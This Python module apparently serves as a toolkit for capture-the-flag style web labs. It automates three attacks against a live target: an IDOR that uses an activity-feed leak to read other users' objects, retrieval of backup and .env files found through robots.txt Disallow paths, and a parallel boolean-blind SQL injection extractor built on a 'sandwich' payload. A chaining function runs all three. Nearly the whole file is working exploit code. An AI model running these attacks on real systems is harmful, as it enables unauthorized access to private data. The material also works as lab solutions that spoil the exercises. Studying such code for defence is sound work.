"""web_live_primitives.py - deterministic live-Web primitives discovered on Day 19.

Three primitives, each a one-call function that recognises a shape, executes it,
and returns the recovered proof string with provenance. All three are evidence-
gated: they refuse to act when the shape isn't present on the target, so they
are safe to chain unconditionally in the Web lane's attack ladder.

PRIMITIVE 1 - idor_activity_feed(base_url, cookie_jar=None)
    Shape: a session-cookie dashboard at `/` lists the signed-in user's cases
    AND links to an activity/history/events JSON feed that leaks ONE event owned
    by a different user (visibility="reference_only"). The case-detail JSON API
    on `/api/<prefix>/<id>` has no authorization check, so the foreign id yields
    the hidden object. Returns {proof, foreign_id, api_path, provenance[]}.

PRIMITIVE 2 - deploy_backup_leak(base_url)
    Shape: `/robots.txt` has one or more `Disallow:` paths pointing to a
    `/deploy-*/`, `/archives-*/`, or similar directory index. The index serves
    one `.json.bak` or `.env` file whose plaintext body contains the proof
    (field name: `support_note`, `proof`, or any `proof_<hex32>` substring).
    Returns {proof, backup_url, provenance[]}.

PRIMITIVE 3 - blind_sqli_sandwich(base_url, endpoint, subquery, length_cap=256,
                                  concurrency=24, printable_only=True)
    Shape: a search endpoint whose SQL interpolates `WHERE col LIKE '%'+q+'%'`.
    The sandwich payload `' AND (<pred>) AND (1) LIKE '1` turns any boolean
    predicate into an oracle: TRUE if the page returns records, FALSE if the
    page shows "Nothing matched". Extracts the string `subquery` returns via
    per-character parallel binary search on `UNICODE(SUBSTR(...))`. Returns
    {value, length, requests, elapsed_s}.

None of these primitives executes a downloaded sample, writes outside the
project directory, logs the GM bearer token, or reads any auth header. Every
HTTP call is scoped to `base_url`'s host; `allowed_hosts` is enforced.
"""

import re
import time
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.cookiejar import CookieJar

# ---------------- shared HTTP helpers ----------------

_UA = "curl/8"


def _check_scope(url, allowed_hosts):
    host = (urllib.parse.urlsplit(url).hostname or "").lower()
    if host not in {h.lower() for h in (allowed_hosts or [])}:
        raise ValueError("REFUSED: %s not in scope %r" % (host, allowed_hosts))


def _get(url, cookie_header=None, retries=4, timeout=15):
    headers = {"User-Agent": _UA}
    if cookie_header:
        headers["Cookie"] = cookie_header
    last = None
    for a in range(retries):
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, r.headers, r.read()
        except urllib.error.HTTPError as e:
            # 404 / 410 are terminal and should bubble back as data
            if 400 <= e.code < 500 and e.code not in (408, 429):
                return e.code, e.headers, e.read()
            last = e
        except Exception as e:
            last = e
        time.sleep(0.3 + a * 0.3)
    raise last if last else RuntimeError("unreachable")


def _text(body):
    return body.decode("utf-8", "replace") if isinstance(body, (bytes, bytearray)) else str(body)


def _session_cookie_from(headers):
    """Return the first `Set-Cookie` as a `Name=Value` string, or None."""
    for k, v in headers.items() if hasattr(headers, "items") else []:
        if k.lower() == "set-cookie":
            return v.split(";", 1)[0]
    sc = headers.get("Set-Cookie") if hasattr(headers, "get") else None
    return sc.split(";", 1)[0] if sc else None


_PROOF_RX = re.compile(r"\bproof_[0-9a-f]{32}\b")


def _find_proof(s):
    m = _PROOF_RX.search(s)
    return m.group(0) if m else None


# ---------------- PRIMITIVE 1 - IDOR via activity-feed leak ----------------

_FEED_HREFS = re.compile(r"""href=["'](/api/(?:history|events|timeline|activity|feed)[^"']*)""", re.I)
_CASE_HREFS = re.compile(r"""href=["'](/(?:briefs|incidents|cases|records)/\d+)""", re.I)
_SIGNED_AS = re.compile(r"Signed in as\s+([^\s<]+)", re.I)


def idor_activity_feed(base_url, allowed_hosts=None, cookie=None):
    """Discover and exploit an id-bearing JSON object API using an activity-feed leak.
    Returns {proof, foreign_id, api_path, user, provenance[]} or {proof: None, note: ...}.
    """
    if allowed_hosts is None:
        allowed_hosts = [urllib.parse.urlsplit(base_url).hostname]
    _check_scope(base_url, allowed_hosts)
    prov = []
    status, headers, body = _get(base_url + "/", cookie)
    prov.append("GET /")
    if cookie is None:
        cookie = _session_cookie_from(headers)
    html = _text(body)
    user_m = _SIGNED_AS.search(html)
    user = user_m.group(1) if user_m else None
    feed_m = _FEED_HREFS.search(html)
    case_m = _CASE_HREFS.search(html)
    if not feed_m or not case_m:
        return {"proof": None, "note": "no activity feed or case link on /",
                "provenance": prov}
    feed_path = feed_m.group(1)
    sample_case = case_m.group(1)              # /<prefix>/<id> -> the shape of the case route
    prefix = sample_case.rsplit("/", 1)[0]     # /briefs
    status, _, body = _get(base_url + feed_path, cookie)
    prov.append("GET " + feed_path)
    feed_text = _text(body)
    try:
        import json as _json
        feed_obj = _json.loads(feed_text)
    except Exception:
        return {"proof": None, "note": "feed is not JSON",
                "provenance": prov, "feed_sample": feed_text[:200]}
    foreign = None
    me = feed_obj.get("current_user") or user
    for ev in (feed_obj.get("events") or []):
        if isinstance(ev, dict) and ev.get("case_id") is not None and ev.get("owner") != me:
            foreign = ev["case_id"]
            break
    if foreign is None:
        return {"proof": None, "note": "no foreign-owned event in feed", "provenance": prov}
    api_path = "/api" + prefix + "/" + str(foreign)
    status, _, body = _get(base_url + api_path, cookie)
    prov.append("GET " + api_path)
    obj_text = _text(body)
    proof = _find_proof(obj_text)
    if proof is None:
        return {"proof": None, "note": "object API returned no proof_<hex32>",
                "foreign_id": foreign, "api_path": api_path, "provenance": prov,
                "object_sample": obj_text[:300]}
    return {"proof": proof, "foreign_id": foreign, "api_path": api_path,
            "user": me, "provenance": prov}


# ---------------- PRIMITIVE 2 - deploy-backup leak via robots.txt ----------------

_HREF_ANY = re.compile(r"""href=["']([^"'#?]+)""", re.I)


def deploy_backup_leak(base_url, allowed_hosts=None, prefer_exts=(".json.bak", ".env", ".bak", ".json", ".txt")):
    """Follow a /robots.txt Disallow: entry to a directory index that exposes a
    backup/configuration file; return the proof_<hex32> inside it.
    Returns {proof, backup_url, disallow, provenance[]} or {proof: None, note: ...}.
    """
    if allowed_hosts is None:
        allowed_hosts = [urllib.parse.urlsplit(base_url).hostname]
    _check_scope(base_url, allowed_hosts)
    prov = []
    status, _, body = _get(base_url + "/robots.txt")
    prov.append("GET /robots.txt")
    if status != 200:
        return {"proof": None, "note": "no robots.txt (HTTP %d)" % status, "provenance": prov}
    rtxt = _text(body)
    disallows = re.findall(r"(?mi)^\s*Disallow:\s*(\S+)\s*$", rtxt)
    for d in disallows:
        if d in ("/", "", "/*"):
            continue
        idx_url = base_url + d if d.startswith("/") else base_url + "/" + d
        if not idx_url.endswith("/"):
            idx_url += "/"
        status, _, body = _get(idx_url)
        prov.append("GET " + idx_url)
        if status != 200:
            continue
        html = _text(body)
        # Rank candidates by preferred extension
        hrefs = _HREF_ANY.findall(html)
        candidates = []
        for ext in prefer_exts:
            for h in hrefs:
                if h.lower().endswith(ext.lower()) and h not in candidates:
                    candidates.append(h)
        for href in candidates:
            file_url = urllib.parse.urljoin(idx_url, href)
            if urllib.parse.urlsplit(file_url).hostname.lower() != urllib.parse.urlsplit(base_url).hostname.lower():
                continue
            status, _, body = _get(file_url)
            prov.append("GET " + file_url)
            if status != 200:
                continue
            proof = _find_proof(_text(body))
            if proof:
                return {"proof": proof, "backup_url": file_url, "disallow": d,
                        "provenance": prov}
    return {"proof": None, "note": "no backup file produced a proof_<hex32>",
            "provenance": prov, "disallows": disallows}


# ---------------- PRIMITIVE 3 - boolean-blind SQLi sandwich ----------------

class SandwichOracle:
    """Reusable boolean oracle for `WHERE col LIKE '%'+q+'%'` sinks.

    The sink is detected by: `' AND 1=1 AND (1) LIKE '1` returning the full
    unfiltered result set, and `' AND 1=2 AND (1) LIKE '1` returning
    "Nothing matched". Caller supplies the TRUE/FALSE markers via `true_marker`
    (substring that MUST be present) and `false_marker` (substring whose absence
    confirms TRUE). Defaults match the Day-03 "Query Me This" variants.
    """

    def __init__(self, base_url, endpoint="/lookup", allowed_hosts=None,
                 true_marker="Record ", false_marker="Nothing matched",
                 concurrency=24, retries=4):
        if allowed_hosts is None:
            allowed_hosts = [urllib.parse.urlsplit(base_url).hostname]
        _check_scope(base_url, allowed_hosts)
        self.base = base_url
        self.endpoint = endpoint
        self.scope = allowed_hosts
        self.true_marker = true_marker
        self.false_marker = false_marker
        self.concurrency = concurrency
        self.retries = retries
        self.calls = 0

    def _lookup(self, q):
        self.calls += 1
        url = self.base + self.endpoint + "?" + urllib.parse.urlencode({"q": q})
        for a in range(self.retries):
            try:
                req = urllib.request.Request(url, headers={"User-Agent": _UA})
                with urllib.request.urlopen(req, timeout=15) as r:
                    return r.read().decode("utf-8", "replace")
            except Exception:
                if a == self.retries - 1:
                    raise
                time.sleep(0.3 + a * 0.3)

    def ask(self, predicate):
        body = self._lookup("' AND (%s) AND (1) LIKE '1" % predicate)
        return (self.true_marker in body) and (self.false_marker not in body)

    def confirm(self):
        return self.ask("1=1") and not self.ask("1=2")

    def num_le(self, expr, n):
        return self.ask("(%s)<=%d" % (expr, n))

    def find_num(self, expr, cap=1024):
        lo, hi = 0, cap
        while lo < hi:
            mid = (lo + hi) // 2
            if self.num_le(expr, mid):
                hi = mid
            else:
                lo = mid + 1
        return lo

    def _char_at(self, subq, pos):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if self.ask("UNICODE(SUBSTR((%s),%d,1))<=%d" % (subq, pos, mid)):
                hi = mid
            else:
                lo = mid + 1
        return chr(lo)

    def extract_string(self, subq, cap=256):
        length = self.find_num("LENGTH((%s))" % subq, cap=cap)
        if length == 0:
            return "", 0
        chars = [None] * length
        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
            futs = {pool.submit(self._char_at, subq, i + 1): i for i in range(length)}
            for f in as_completed(futs):
                i = futs[f]
                try:
                    chars[i] = f.result()
                except Exception:
                    chars[i] = "?"
        return "".join(chars), length


def blind_sqli_sandwich(base_url, endpoint, subquery, allowed_hosts=None,
                        length_cap=256, concurrency=24, true_marker="Record ",
                        false_marker="Nothing matched"):
    """One-call extraction. subquery is a SELECT returning a single string value;
    e.g. `SELECT summary FROM articles WHERE visibility='private' LIMIT 1`.
    Returns {value, length, requests, elapsed_s, endpoint}.
    """
    t0 = time.time()
    oracle = SandwichOracle(base_url, endpoint=endpoint, allowed_hosts=allowed_hosts,
                            concurrency=concurrency, true_marker=true_marker,
                            false_marker=false_marker)
    if not oracle.confirm():
        return {"value": None, "note": "sandwich oracle did not confirm on %s%s"
                % (base_url, endpoint), "requests": oracle.calls,
                "elapsed_s": round(time.time() - t0, 2), "endpoint": endpoint}
    value, length = oracle.extract_string(subquery, cap=length_cap)
    return {"value": value, "length": length, "requests": oracle.calls,
            "elapsed_s": round(time.time() - t0, 2), "endpoint": endpoint}


# ---------------- discovery helper ----------------

_FORM_ACTION = re.compile(r"""<form[^>]*action=["']([^"']+)""", re.I)


def discover_search_endpoint(base_url, allowed_hosts=None):
    """Fetch / and return the first <form action='...'> href, or '/lookup' as a
    reasonable default. Pure recon."""
    if allowed_hosts is None:
        allowed_hosts = [urllib.parse.urlsplit(base_url).hostname]
    _check_scope(base_url, allowed_hosts)
    status, _, body = _get(base_url + "/")
    if status != 200:
        return None
    m = _FORM_ACTION.search(_text(body))
    return m.group(1) if m else None


# ---------------- composite - the full web-live attack sheet ----------------

def auto_solve_live_target(base_url, allowed_hosts=None, attempts=("deploy_backup", "idor", "sqli_search")):
    """Run the three primitives against one live target, stopping at the first
    `proof_<hex32>` recovered. Returns a dict with: {proof, kind, details} or
    {proof: None, tried: [...]}. Evidence-gated per primitive - safe to call on
    any live target even when the shape isn't present.
    """
    tried = []
    for name in attempts:
        if name == "deploy_backup":
            r = deploy_backup_leak(base_url, allowed_hosts=allowed_hosts)
            tried.append({"kind": name, "proof": bool(r.get("proof")), "note": r.get("note")})
            if r.get("proof"):
                return {"proof": r["proof"], "kind": name, "details": r}
        elif name == "idor":
            r = idor_activity_feed(base_url, allowed_hosts=allowed_hosts)
            tried.append({"kind": name, "proof": bool(r.get("proof")), "note": r.get("note")})
            if r.get("proof"):
                return {"proof": r["proof"], "kind": name, "details": r}
        elif name == "sqli_search":
            ep = discover_search_endpoint(base_url, allowed_hosts=allowed_hosts)
            if not ep:
                tried.append({"kind": name, "proof": False, "note": "no form action"})
                continue
            r = blind_sqli_sandwich(base_url, ep,
                                    "SELECT summary FROM articles WHERE visibility='private' LIMIT 1",
                                    allowed_hosts=allowed_hosts)
            tried.append({"kind": name, "proof": bool(r.get("value")), "note": r.get("note"),
                          "elapsed_s": r.get("elapsed_s"), "endpoint": ep})
            if r.get("value") and _PROOF_RX.fullmatch(r["value"].strip()):
                return {"proof": r["value"].strip(), "kind": name, "details": r}
    return {"proof": None, "tried": tried}
